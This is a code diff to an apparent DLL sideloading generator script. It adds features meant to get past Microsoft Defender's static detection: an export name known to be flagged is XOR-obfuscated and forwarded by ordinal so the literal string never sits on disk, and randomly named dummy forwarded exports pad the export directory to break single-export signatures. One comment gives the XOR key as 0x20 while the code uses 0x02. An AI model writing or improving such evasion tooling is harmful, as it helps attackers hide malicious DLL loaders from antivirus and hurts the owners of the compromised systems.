@@ -21,6 +21,8 @@ Then:
 import sys
 import os
 import struct
+import random
+import string
 import ctypes
 from ctypes import wintypes
 
@@ -275,12 +277,54 @@ def parse_exports(dll_path):
     return exports, ordinal_base
 
 
+# Forwarding targets for dummy exports.  All are ntdll/kernel32 functions
+# that are always present.  Nobody imports these from our proxy so Windows
+# never resolves the forwards; they exist only to pad the export directory.
+_DUMMY_FORWARD_POOL = [
+    "ntdll.RtlAllocateHeap",
+    "ntdll.RtlFreeHeap",
+    "ntdll.NtClose",
+    "ntdll.RtlCopyMemory",
+    "ntdll.RtlZeroMemory",
+    "kernel32.GetLastError",
+    "kernel32.SetLastError",
+    "kernel32.GetCurrentThreadId",
+    "kernel32.GetCurrentProcessId",
+    "kernel32.GetTickCount",
+]
+_DUMMY_EXPORT_COUNT = 3
+
+
+def _random_export_name(taken, min_len=8, max_len=14):
+    """Return a random PascalCase export name not already in 'taken'."""
+    chars = string.ascii_letters + string.digits
+    while True:
+        name = random.choice(string.ascii_uppercase) + ''.join(
+            random.choice(chars) for _ in range(random.randint(min_len - 1, max_len - 1))
+        )
+        if name not in taken:
+            return name
+
+
 def generate_sideload_h(exports, orig_name, renamed_name, target_exe=None):
     """Generate Sideload.h content with export forwarding pragmas."""
     # Linker uses DLL name without .dll extension for forward references
     link_name = renamed_name
     if link_name.lower().endswith('.dll'):
         link_name = link_name[:-4]
+
+    # Export names that carry a Defender static signature.
+    # These are XOR-obfuscated (key 0x20) in the compiled binary \u2014 the literal string
+    # never appears on disk.  DllMain XOR-decodes them in place at load time, before
+    # the PE loader snaps the host's IAT, so the loader sees the real name at runtime.
+    # The forward target uses the ordinal (#N) so no flagged string appears there either.
+    _EXPORT_PATCH_KEY = 0x02
+    _BLOCKED_EXPORT_NAMES = {
+        "APIExportForDetours",
+    }
+
+    # Build name\u2192ordinal map for ordinal-based forwarding of patched exports.
+    export_ordinal = {n: o for n, o in exports if n}
 
     lines = [
         "#pragma once",
@@ -301,13 +345,22 @@ def generate_sideload_h(exports, orig_name, renamed_name, target_exe=None):
 
     named_count = 0
     ordinal_count = 0
+    patch_entries = []  # (xored_name_str, real_len) for DllMain patch macros
 
     # Sort: named exports alphabetically, then ordinal-only by ordinal
     for name, ordinal in sorted(exports, key=lambda x: (x[0] is None, x[0] or '', x[1])):
         if name:
-            lines.append(
-                f'#pragma comment(linker, "/export:{name}={link_name}.{name}")'
-            )
+            if name in _BLOCKED_EXPORT_NAMES:
+                # Obfuscate: emit XOR'd name, forward by ordinal (no flagged string anywhere)
+                xored = ''.join(chr(ord(c) ^ _EXPORT_PATCH_KEY) for c in name)
+                lines.append(
+                    f'#pragma comment(linker, "/export:{xored}={link_name}.#{ordinal}")'
+                )
+                patch_entries.append((xored, len(name)))
+            else:
+                lines.append(
+                    f'#pragma comment(linker, "/export:{name}={link_name}.{name}")'
+                )
             named_count += 1
         else:
             # Ordinal-only: internal name is arbitrary (NONAME hides it)
@@ -315,6 +368,38 @@ def generate_sideload_h(exports, orig_name, renamed_name, target_exe=None):
                 f'#pragma comment(linker, "/export:Ordinal{ordinal}={link_name}.#{ordinal},@{ordinal},NONAME")'
             )
             ordinal_count += 1
+
+    # --- Dummy forwarded exports ---
+    # Break the NumFunctions=1 / NumNames=1 static signature by padding the
+    # export directory with random-named forwards.  These are never imported
+    # by the host EXE so Windows never resolves them.  Random names change
+    # the export directory byte layout (RVA values, string positions) on
+    # every SideloadGen.py run.
+    lines.append("")
+    lines.append("// Dummy exports — pad export directory to break single-export static signatures")
+    used_names = {n for n, _ in exports}
+    dummy_targets = random.sample(_DUMMY_FORWARD_POOL,
+                                  min(_DUMMY_EXPORT_COUNT, len(_DUMMY_FORWARD_POOL)))
+    dummy_names = []
+    for target in dummy_targets:
+        dname = _random_export_name(used_names)
+        used_names.add(dname)
+        dummy_names.append(dname)
+        lines.append(f'#pragma comment(linker, "/export:{dname}={target}")')
+
+    # Emit DllMain patch metadata for any obfuscated exports.
+    lines.append("")
+    if patch_entries:
+        lines.append("// Blocked export name patches \u2014 decoded in DllMain before the host IAT snap.")
+        lines.append(f"// XOR key 0x{_EXPORT_PATCH_KEY:02X}: real name = xored_name ^ key for each byte.")
+        lines.append(f"#define SIDELOAD_EXPORT_PATCH_COUNT  {len(patch_entries)}")
+        lines.append(f"#define SIDELOAD_EXPORT_PATCH_KEY    0x{_EXPORT_PATCH_KEY:02X}")
+        names_init = ", ".join(f'"{e[0]}"' for e in patch_entries)
+        lens_init  = ", ".join(str(e[1])   for e in patch_entries)
+        lines.append(f"#define SIDELOAD_EXPORT_PATCH_XORED_NAMES  {{ {names_init} }}")
+        lines.append(f"#define SIDELOAD_EXPORT_PATCH_LENS          {{ {lens_init} }}")
+    else:
+        lines.append("#define SIDELOAD_EXPORT_PATCH_COUNT  0")
 
     lines.append("")
     return "\n".join(lines) + "\n", named_count, ordinal_count
@@ -389,6 +474,16 @@ def main():
 
     print(f"[+] Generated: Sideload.h")
     print(f"[+] Forwarding: {orig_name} -> {renamed}")
+
+    # Report any signature-patched exports
+    _BLOCKED = {"APIExportForDetours"}
+    patched = [n for n, _ in exports if n in _BLOCKED]
+    if patched:
+        for pn in patched:
+            _KEY = 0x02
+            xn = ''.join(chr(ord(c) ^ _KEY) for c in pn)
+            print(f"[+] Obfuscated export: {pn!r} -> {xn!r} (XOR 0x{_KEY:02X}, decoded at runtime)")
+    print(f"[+] Added {_DUMMY_EXPORT_COUNT} dummy forwarded exports (NumFunctions 1 -> {len(exports) + _DUMMY_EXPORT_COUNT})")
 
     # Extract and clone version info from target DLL
     ver_info = extract_version_info(dll_path)
